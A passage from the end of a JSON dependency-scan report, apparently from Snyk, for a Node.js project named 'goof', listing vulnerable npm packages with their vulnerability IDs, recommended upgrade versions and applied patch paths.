            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "y18n",
            "version": "4.0.0",
            "severityWithCritical": "high"
          }
        ],
        "upgrade": {
          "adm-zip@0.4.7": {
            "upgradeTo": "adm-zip@0.5.2",
            "upgrades": [
              "adm-zip@0.4.7",
              "adm-zip@0.4.7"
            ],
            "vulns": [
              "SNYK-JS-ADMZIP-1065796",
              "npm:adm-zip:20180415"
            ]
          },
          "body-parser@1.9.0": {
            "upgradeTo": "body-parser@1.17.1",
            "upgrades": [
              "qs@2.2.4"
            ],
            "vulns": [
              "npm:qs:20170213"
            ]
          },
          "cfenv@1.2.2": {
            "upgradeTo": "cfenv@1.2.4",
            "upgrades": [
              "underscore@1.9.1"
            ],
            "vulns": [
              "SNYK-JS-UNDERSCORE-1080984"
            ]
          },
          "dustjs-linkedin@2.5.0": {
            "upgradeTo": "dustjs-linkedin@3.0.0",
            "upgrades": [
              "dustjs-linkedin@2.5.0",
              "dustjs-linkedin@2.5.0"
            ],
            "vulns": [
              "SNYK-JS-DUSTJSLINKEDIN-1089257",
              "npm:dustjs-linkedin:20160819"
            ]
          },
          "ejs@1.0.0": {
            "upgradeTo": "ejs@3.1.7",
            "upgrades": [
              "ejs@1.0.0",
              "ejs@1.0.0",
              "ejs@1.0.0",
              "ejs@1.0.0",
              "ejs@1.0.0"
            ],
            "vulns": [
              "SNYK-JS-EJS-2803307",
              "SNYK-JS-EJS-1049328",
              "npm:ejs:20161130",
              "npm:ejs:20161130-1",
              "npm:ejs:20161128"
            ]
          },
          "errorhandler@1.2.0": {
            "upgradeTo": "errorhandler@1.4.3",
            "upgrades": [
              "negotiator@0.4.9"
            ],
            "vulns": [
              "npm:negotiator:20160616"
            ]
          },
          "express@4.12.4": {
            "upgradeTo": "express@4.16.0",
            "upgrades": [
              "mime@1.3.4",
              "debug@2.2.0",
              "fresh@0.2.4",
              "ms@0.7.1",
              "qs@2.4.2",
              "negotiator@0.5.3"
            ],
            "vulns": [
              "npm:mime:20170907",
              "npm:debug:20170905",
              "npm:fresh:20170908",
              "npm:ms:20170412",
              "npm:qs:20170213",
              "npm:negotiator:20160616"
            ]
          },
          "express-fileupload@0.0.5": {
            "upgradeTo": "express-fileupload@1.1.10",
            "upgrades": [
              "express-fileupload@0.0.5",
              "express-fileupload@0.0.5"
            ],
            "vulns": [
              "SNYK-JS-EXPRESSFILEUPLOAD-595969",
              "SNYK-JS-EXPRESSFILEUPLOAD-473997"
            ]
          },
          "hbs@4.0.4": {
            "upgradeTo": "hbs@4.1.2",
            "upgrades": [
              "handlebars@4.0.14",
              "handlebars@4.0.14",
              "handlebars@4.0.14",
              "handlebars@4.0.14",
              "handlebars@4.0.14",
              "handlebars@4.0.14",
              "handlebars@4.0.14"
            ],
            "vulns": [
              "SNYK-JS-HANDLEBARS-1056767",
              "SNYK-JS-HANDLEBARS-1279029",
              "SNYK-JS-HANDLEBARS-567742",
              "SNYK-JS-HANDLEBARS-480388",
              "SNYK-JS-HANDLEBARS-534478",
              "SNYK-JS-HANDLEBARS-534988",
              "SNYK-JS-HANDLEBARS-469063"
            ]
          },
          "jquery@2.2.4": {
            "upgradeTo": "jquery@3.5.0",
            "upgrades": [
              "jquery@2.2.4",
              "jquery@2.2.4",
              "jquery@2.2.4",
              "jquery@2.2.4"
            ],
            "vulns": [
              "SNYK-JS-JQUERY-565129",
              "SNYK-JS-JQUERY-567880",
              "SNYK-JS-JQUERY-174006",
              "npm:jquery:20150627"
            ]
          },
          "lodash@4.17.4": {
            "upgradeTo": "lodash@4.17.21",
            "upgrades": [
              "lodash@4.17.4",
              "lodash@4.17.4",
              "lodash@4.17.4",
              "lodash@4.17.4",
              "lodash@4.17.4",
              "lodash@4.17.4",
              "lodash@4.17.4",
              "lodash@4.17.4"
            ],
            "vulns": [
              "SNYK-JS-LODASH-1018905",
              "SNYK-JS-LODASH-1040724",
              "SNYK-JS-LODASH-567746",
              "SNYK-JS-LODASH-608086",
              "SNYK-JS-LODASH-450202",
              "SNYK-JS-LODASH-73638",
              "SNYK-JS-LODASH-73639",
              "npm:lodash:20180130"
            ]
          },
          "marked@0.3.5": {
            "upgradeTo": "marked@4.0.10",
            "upgrades": [
              "marked@0.3.5",
              "marked@0.3.5",
              "marked@0.3.5",
              "marked@0.3.5",
              "marked@0.3.5",
              "marked@0.3.5",
              "marked@0.3.5",
              "marked@0.3.5",
              "marked@0.3.5",
              "marked@0.3.5",
              "marked@0.3.5"
            ],
            "vulns": [
              "SNYK-JS-MARKED-2342073",
              "SNYK-JS-MARKED-2342082",
              "SNYK-JS-MARKED-584281",
              "SNYK-JS-MARKED-174116",
              "SNYK-JS-MARKED-451540",
              "npm:marked:20180225",
              "npm:marked:20170815",
              "npm:marked:20170815-1",
              "npm:marked:20170907",
              "npm:marked:20170112",
              "npm:marked:20150520"
            ]
          },
          "moment@2.15.1": {
            "upgradeTo": "moment@2.29.2",
            "upgrades": [
              "moment@2.15.1",
              "moment@2.15.1",
              "moment@2.15.1"
            ],
            "vulns": [
              "SNYK-JS-MOMENT-2440688",
              "npm:moment:20170905",
              "npm:moment:20161019"
            ]
          },
          "mongoose@4.2.4": {
            "upgradeTo": "mongoose@5.13.9",
            "upgrades": [
              "mpath@0.1.1",
              "mquery@1.6.3",
              "mongoose@4.2.4",
              "mquery@1.6.3",
              "async@0.9.0",
              "mongodb@2.0.46",
              "mongoose@4.2.4",
              "debug@2.2.0",
              "ms@0.7.1",
              "mongoose@4.2.4",
              "kerberos@0.0.24"
            ],
            "vulns": [
              "SNYK-JS-MPATH-1577289",
              "SNYK-JS-MQUERY-1089718",
              "SNYK-JS-MONGOOSE-1086688",
              "SNYK-JS-MQUERY-1050858",
              "SNYK-JS-ASYNC-2441827",
              "SNYK-JS-MONGODB-473855",
              "SNYK-JS-MONGOOSE-472486",
              "npm:debug:20170905",
              "npm:ms:20170412",
              "npm:mongoose:20160116",
              "SNYK-JS-KERBEROS-568900"
            ]
          },
          "ms@0.7.3": {
            "upgradeTo": "ms@2.0.0",
            "upgrades": [
              "ms@0.7.3"
            ],
            "vulns": [
              "npm:ms:20170412"
            ]
          },
          "npmconf@0.0.24": {
            "upgradeTo": "npmconf@2.1.3",
            "upgrades": [
              "npmconf@0.0.24",
              "semver@1.1.4",
              "ini@1.1.0"
            ],
            "vulns": [
              "npm:npmconf:20180512",
              "npm:semver:20150403",
              "SNYK-JS-INI-1048974"
            ]
          },
          "st@0.2.4": {
            "upgradeTo": "st@1.2.2",
            "upgrades": [
              "st@0.2.4",
              "mime@1.2.11",
              "negotiator@0.2.8",
              "st@0.2.4"
            ],
            "vulns": [
              "npm:st:20171013",
              "npm:mime:20170907",
              "npm:negotiator:20160616",
              "npm:st:20140206"
            ]
          },
          "tap@11.1.5": {
            "upgradeTo": "tap@15.0.0",
            "upgrades": [
              "ansi-regex@3.0.0",
              "istanbul-reports@1.4.0",
              "yargs-parser@9.0.2",
              "mem@1.1.0"
            ],
            "vulns": [
              "SNYK-JS-ANSIREGEX-1583908",
              "SNYK-JS-ISTANBULREPORTS-2328088",
              "SNYK-JS-YARGSPARSER-560381",
              "npm:mem:20180117"
            ]
          },
          "typeorm@0.2.24": {
            "upgradeTo": "typeorm@0.2.27",
            "upgrades": [
              "ansi-regex@4.1.0",
              "typeorm@0.2.24"
            ],
            "vulns": [
              "SNYK-JS-ANSIREGEX-1583908",
              "SNYK-JS-TYPEORM-590152"
            ]
          },
          "validator@13.5.2": {
            "upgradeTo": "validator@13.7.0",
            "upgrades": [
              "validator@13.5.2",
              "validator@13.5.2",
              "validator@13.5.2",
              "validator@13.5.2"
            ],
            "vulns": [
              "SNYK-JS-VALIDATOR-1090600",
              "SNYK-JS-VALIDATOR-1090599",
              "SNYK-JS-VALIDATOR-1090601",
              "SNYK-JS-VALIDATOR-1090602"
            ]
          }
        },
        "patch": {
          "SNYK-JS-LODASH-567746": {
            "paths": [
              {
                "tap > nyc > istanbul-lib-instrument > babel-types > lodash": {
                  "patched": "2022-04-26T21:30:36.264Z"
                }
              },
              {
                "tap > nyc > istanbul-lib-instrument > babel-generator > lodash": {
                  "patched": "2022-04-26T21:30:36.264Z"
                }
              },
              {
                "tap > nyc > istanbul-lib-instrument > babel-traverse > lodash": {
                  "patched": "2022-04-26T21:30:36.264Z"
                }
              },
              {
                "tap > nyc > istanbul-lib-instrument > babel-template > lodash": {
                  "patched": "2022-04-26T21:30:36.264Z"
                }
              },
              {
                "tap > nyc > istanbul-lib-instrument > babel-generator > babel-types > lodash": {
                  "patched": "2022-04-26T21:30:36.264Z"
                }
              },
              {
                "tap > nyc > istanbul-lib-instrument > babel-traverse > babel-types > lodash": {
                  "patched": "2022-04-26T21:30:36.264Z"
                }
              },
              {
                "tap > nyc > istanbul-lib-instrument > babel-template > babel-types > lodash": {
                  "patched": "2022-04-26T21:30:36.264Z"
                }
              },
              {
                "tap > nyc > istanbul-lib-instrument > babel-template > babel-traverse > lodash": {
                  "patched": "2022-04-26T21:30:36.264Z"
                }
              },
              {
                "tap > nyc > istanbul-lib-instrument > babel-template > babel-traverse > babel-types > lodash": {
                  "patched": "2022-04-26T21:30:36.264Z"
                }
              }
            ]
          },
          "npm:ms:20151024": {
            "paths": [
              {
                "humanize-ms > ms": {
                  "patched": "2022-04-26T21:30:36.264Z"
                }
              }
            ]
          }
        },
        "ignore": {},
        "pin": {}
      },
      "filesystemPolicy": false,
      "filtered": {
        "ignore": [],
        "patch": []
      },
      "uniqueCount": 94,
      "projectName": "goof",
      "displayTargetFile": "package-lock.json",
      "path": ".\\nodejs-goof\\"
    }
  }
}